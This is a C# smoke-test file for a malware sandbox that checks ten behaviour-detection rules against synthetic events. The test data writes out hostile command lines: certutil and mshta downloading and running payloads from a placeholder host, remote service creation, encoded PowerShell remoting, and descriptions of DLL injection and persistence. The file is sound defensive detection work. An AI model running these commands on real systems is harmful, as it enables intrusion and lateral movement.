using KSword.Sandbox.Abstractions;
using KSword.Sandbox.Core.Rules;
using KSword.Sandbox.SmokeTests.Assertions;
using KSword.Sandbox.SmokeTests.Framework;

namespace KSword.Sandbox.SmokeTests.Scenarios;

/// <summary>
/// Compile-only repository guard for the v27 behavior-rule expansion. Inputs
/// are behavior-rules.json plus synthetic local events; processing verifies
/// that the new Sigma/Elastic/Splunk/LOLBAS-inspired rules stay constrained by
/// local fields and v26 self-noise guards without running a smoke test here.
/// </summary>
internal sealed class BehaviorRuleV27ExpansionScenario : ISmokeTestScenario
{
    private static readonly string[] RequiredRuleIds =
    [
        "persistence-ifeo-verifierdll-user-writable",
        "persistence-bits-notifycmdline-user-writable",
        "injection-createremotethread-loadlibrary-user-dll",
        "injection-queueuserapc-loadlibrary-suspended-process",
        "lateral-svcctl-remote-service-user-writable-binary",
        "lateral-winrm-encoded-command-remote-target",
        "anti-sandbox-tool-enumeration-gated-exit",
        "anti-sandbox-sleep-skew-gated-execution",
        "download-execute-certutil-urlcache-user-launch",
        "download-execute-mshta-remote-scriptlet-user-payload"
    ];

    public string ScenarioId => "behavior.rules-v27-expansion";

    /// <inheritdoc />
    public Task<SmokeTestResult> RunAsync(SmokeTestContext context, CancellationToken cancellationToken = default)
    {
        cancellationToken.ThrowIfCancellationRequested();

        var behaviorRulesPath = Path.Combine(context.RulesDirectory, "behavior-rules.json");
        SmokeAssert.True(File.Exists(behaviorRulesPath), "behavior-rules.json is missing.");

        var rules = RuleEngine.LoadRuleSet(behaviorRulesPath);
        SmokeAssert.True(
            string.Equals(rules.Version, "2026-07-12-v27-behavior-rule-expansion", StringComparison.OrdinalIgnoreCase),
            "Behavior rules should carry the v27 behavior-rule expansion version.");

        var indexedRules = rules.Rules.ToDictionary(rule => rule.Id, StringComparer.OrdinalIgnoreCase);
        foreach (var ruleId in RequiredRuleIds)
        {
            SmokeAssert.True(indexedRules.TryGetValue(ruleId, out var rule), $"v27 rule '{ruleId}' is missing.");
            AssertRuleContract(rule!);
        }

        AssertSyntheticMatches(rules);
        AssertSelfNoiseGuards(rules);

        return Task.FromResult(new SmokeTestResult
        {
            ScenarioId = ScenarioId,
            Passed = true,
            Message = $"{RequiredRuleIds.Length} v27 behavior rules load, match constrained synthetic events, and retain v26 self-noise guards."
        });
    }

    private static void AssertRuleContract(BehaviorRule rule)
    {
        SmokeAssert.True(!string.IsNullOrWhiteSpace(rule.MitreTechniqueId), $"Rule '{rule.Id}' should include a MITRE technique ID.");
        SmokeAssert.True(rule.EvidenceFields.Count > 0, $"Rule '{rule.Id}' should document evidence fields.");
        SmokeAssert.True(rule.Tags.Contains("open-source-reference", StringComparer.OrdinalIgnoreCase), $"Rule '{rule.Id}' should carry source-reference tags through existing metadata.");
        SmokeAssert.True(
            rule.Tags.Contains("sigma-style", StringComparer.OrdinalIgnoreCase) ||
            rule.Tags.Contains("elastic-style", StringComparer.OrdinalIgnoreCase) ||
            rule.Tags.Contains("splunk-style", StringComparer.OrdinalIgnoreCase) ||
            rule.Tags.Contains("lolbas-inspired", StringComparer.OrdinalIgnoreCase),
            $"Rule '{rule.Id}' should identify the open-source behavior family inspiration in tags.");
        SmokeAssert.True(
            rule.CommandLineRegex.Count > 0 ||
            rule.DataContainsAll.Count > 0 ||
            rule.DataRegex.Count > 0 ||
            rule.AllDataRegex.Count > 0 ||
            rule.AllDataNumericRanges.Count > 0,
            $"Rule '{rule.Id}' should use constrained predicates rather than broad substring-only matching.");
        SmokeAssert.True(
            rule.ExcludeProcessNames.Contains("KSword.Sandbox.Agent.exe", StringComparer.OrdinalIgnoreCase) &&
            rule.ExcludeProcessNames.Contains("KSword.Sandbox.R0Collector.exe", StringComparer.OrdinalIgnoreCase),
            $"Rule '{rule.Id}' should exclude sandbox plumbing process names.");
        SmokeAssert.True(ContainsGuard(rule.ExcludeDataContains, "source", "collection-health"), $"Rule '{rule.Id}' should exclude collection-health source rows.");
        SmokeAssert.True(ContainsGuard(rule.ExcludeDataContains, "source", "virustotal"), $"Rule '{rule.Id}' should exclude VirusTotal source rows.");
        SmokeAssert.True(ContainsGuard(rule.ExcludeDataContains, "source", "r0collector"), $"Rule '{rule.Id}' should exclude R0 collector source rows.");
        SmokeAssert.True(ContainsGuard(rule.ExcludeDataContains, "collectorSelfNoise", "true"), $"Rule '{rule.Id}' should exclude collector self-noise.");
        SmokeAssert.True(ContainsGuard(rule.ExcludeDataContains, "collectorNoise", "true"), $"Rule '{rule.Id}' should exclude collector noise.");
        SmokeAssert.True(ContainsGuard(rule.ExcludeDataEquals, "behaviorCounted", "false"), $"Rule '{rule.Id}' should exclude behaviorCounted=false rows.");
        SmokeAssert.True(ContainsGuard(rule.ExcludeDataEquals, "nonbehavior", "true"), $"Rule '{rule.Id}' should exclude nonbehavior=true rows.");
    }

    private static void AssertSyntheticMatches(BehaviorRuleSet rules)
    {
        var findingIds = new RuleEngine(rules)
            .Classify(CreatePositiveEvents())
            .Select(finding => finding.RuleId)
            .ToHashSet(StringComparer.OrdinalIgnoreCase);

        foreach (var ruleId in RequiredRuleIds)
        {
            SmokeAssert.True(findingIds.Contains(ruleId), $"Synthetic v27 event should match '{ruleId}'.");
        }
    }

    private static void AssertSelfNoiseGuards(BehaviorRuleSet rules)
    {
        var noiseFindings = new RuleEngine(rules)
            .Classify(CreateNoiseEvents())
            .Select(finding => finding.RuleId)
            .ToHashSet(StringComparer.OrdinalIgnoreCase);

        foreach (var ruleId in RequiredRuleIds)
        {
            SmokeAssert.True(!noiseFindings.Contains(ruleId), $"Self-noise event should not match v27 rule '{ruleId}'.");
        }
    }

    private static IReadOnlyList<SandboxEvent> CreatePositiveEvents()
    {
        return
        [
            new SandboxEvent
            {
                EventType = "registry.set",
                Source = "guest",
                Path = @"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe\VerifierDll",
                Data =
                {
                    ["path"] = @"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe\VerifierDll",
                    ["valueName"] = "VerifierDll",
                    ["value"] = @"C:\Users\Public\stage\hook.dll"
                }
            },
            new SandboxEvent
            {
                EventType = "bits.job.modified",
                Source = "guest",
                Data =
                {
                    ["jobType"] = "bits",
                    ["jobId"] = "{11111111-1111-1111-1111-111111111111}",
                    ["valueName"] = "NotifyCmdLine",
                    ["value"] = @"C:\Users\Public\stage\notify.exe"
                }
            },
            new SandboxEvent
            {
                EventType = "api.sequence",
                Source = "guest",
                ProcessName = "payload.exe",
                Data =
                {
                    ["operation"] = "VirtualAllocEx WriteProcessMemory CreateRemoteThread LoadLibrary",
                    ["targetProcessName"] = "explorer.exe",
                    ["dllPath"] = @"C:\Users\Public\stage\inject.dll"
                }
            },
            new SandboxEvent
            {
                EventType = "api.sequence",
                Source = "guest",
                ProcessName = "payload.exe",
                Data =
                {
                    ["operation"] = "CreateProcess suspended QueueUserAPC LoadLibrary",
                    ["targetProcessName"] = "notepad.exe",
                    ["payloadPath"] = @"C:\Users\Public\stage\apc.dll"
                }
            },
            new SandboxEvent
            {
                EventType = "service.created",
                Source = "guest",
                ProcessName = "sc.exe",
                CommandLine = @"sc.exe \\workstation01 create Updater binPath= C:\Users\Public\stage\svc.exe",
                Data =
                {
                    ["remoteHost"] = "workstation01",
                    ["serviceName"] = "Updater",
                    ["serviceBinary"] = @"C:\Users\Public\stage\svc.exe",
                    ["operation"] = "CreateService"
                }
            },
            new SandboxEvent
            {
                EventType = "process.start",
                Source = "guest",
                ProcessName = "powershell.exe",
                CommandLine = @"powershell.exe Invoke-Command -ComputerName workstation02 -EncodedCommand SQBFAFgA",
                Data =
                {
                    ["remoteHost"] = "workstation02",
                    ["scriptBlockText"] = "FromBase64String IEX Invoke-Expression"
                }
            },
            new SandboxEvent
            {
                EventType = "anti_sandbox.check",
                Source = "guest",
                ProcessName = "payload.exe",
                Data =
                {
                    ["check"] = "vmtools service process enumeration",
                    ["action"] = "exit gate",
                    ["matchedName"] = "vmtoolsd.exe"
                }
            },
            new SandboxEvent
            {
                EventType = "api.sleep",
                Source = "guest",
                ProcessName = "payload.exe",
                Data =
                {
                    ["check"] = "GetTickCount sleep time skew",
                    ["action"] = "abort gate",
                    ["requestedSleepMs"] = "60000",
                    ["observedSkewMs"] = "2500"
                }
            },
            new SandboxEvent
            {
                EventType = "download.execute",
                Source = "guest",
                ProcessName = "certutil.exe",
                CommandLine = @"certutil.exe -urlcache -split -f https://example.invalid/a.exe C:\Users\Public\stage\a.exe",
                Data =
                {
                    ["sourceUrl"] = "https://example.invalid/a.exe",
                    ["executedPath"] = @"C:\Users\Public\stage\a.exe"
                }
            },
            new SandboxEvent
            {
                EventType = "download.execute",
                Source = "guest",
                ProcessName = "mshta.exe",
                CommandLine = "mshta.exe https://example.invalid/payload.hta",
                Data =
                {
                    ["sourceUrl"] = "https://example.invalid/payload.hta",
                    ["executedPath"] = @"C:\Users\Public\stage\payload.exe"
                }
            }
        ];
    }

    private static IReadOnlyList<SandboxEvent> CreateNoiseEvents()
    {
        return CreatePositiveEvents()
            .Select(evt =>
            {
                var data = new Dictionary<string, string>(evt.Data, StringComparer.OrdinalIgnoreCase)
                {
                    ["collectorSelfNoise"] = "true",
                    ["behaviorCounted"] = "false"
                };

                return evt with
                {
                    ProcessName = "KSword.Sandbox.Agent.exe",
                    Data = data
                };
            })
            .ToArray();
    }

    private static bool ContainsGuard(IReadOnlyDictionary<string, List<string>> values, string key, string value)
    {
        return values.TryGetValue(key, out var candidates) && candidates.Contains(value, StringComparer.OrdinalIgnoreCase);
    }
}
